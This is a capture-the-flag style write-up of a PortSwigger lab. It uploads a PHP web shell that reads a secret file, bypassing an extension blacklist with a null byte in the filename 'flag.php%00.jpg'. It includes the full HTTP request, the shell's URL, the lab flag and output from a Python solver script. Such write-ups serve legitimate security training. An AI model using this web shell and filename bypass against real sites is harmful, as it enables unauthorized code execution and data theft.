# Lab: Web shell upload via obfuscated file extension

### Instructions

This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed using a classic obfuscation technique.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter` 

### Solution

We can login with the provided credentials and attempt to upload a PHP file to read the flag:

```php
<?php system('cat /home/carlos/secret'); ?>
```

This gives us an error: `Sorry, only JPG & PNG files are allowed Sorry, there was an error uploading your file.`

Let's capture this in Burp for testing.

Trying a few different file types, we find we can successfully load the script using a null-byte:

```
POST /my-account/avatar HTTP/2
Host: 0a30000f04f21a4880a1766f006200f5.web-security-academy.net
Cookie: session=bhmJhfj3BjKR8T4a7ctmnAU3P1wNbABB
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------188818814037438375082634552059
Content-Length: 538
Origin: https://0a30000f04f21a4880a1766f006200f5.web-security-academy.net
Referer: https://0a30000f04f21a4880a1766f006200f5.web-security-academy.net/my-account
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

-----------------------------188818814037438375082634552059
Content-Disposition: form-data; name="avatar"; filename="flag.php%00.jpg"
Content-Type: application/x-php

<?php system('cat /home/carlos/secret'); ?>

-----------------------------188818814037438375082634552059
Content-Disposition: form-data; name="user"

wiener
-----------------------------188818814037438375082634552059
Content-Disposition: form-data; name="csrf"

hF5KYyOBXlyISNCTTBmrTOoZuWVqr7P7
-----------------------------188818814037438375082634552059--
```

```
The file avatars/flag.php has been uploaded
```

This satisfies the filter ensuring an image extension (`.jpg`), but as the file is written the null-byte (`%00`) terminates the string causing the file to be saved as `flag.php`

We can then access the flag at: `https://0a30000f04f21a4880a1766f006200f5.web-security-academy.net/files/avatars/flag.php`

`tBHeDal2ZEkWjrcWoe2868eCGxYGGGTw`

Which can be used to solve the lab.

### Python Solution

See `file_upload_05.py`.

```
┌──(ryan㉿kali)-[~/PortSwigger_Labs/File_Upload_Vulnerabilities/File_Upload_05_web_shell_upload_via_obfuscated_file_extension]
└─$ python file_upload_05.py https://0a30000f04f21a4880a1766f006200f5.web-security-academy.net/
[+] Logged in as wiener
[+] File uploaded
[+] The lab's flag is: tBHeDal2ZEkWjrcWoe2868eCGxYGGGTw
[*] Submitting flag to solve lab...
[+] Successfully submitted the flag
```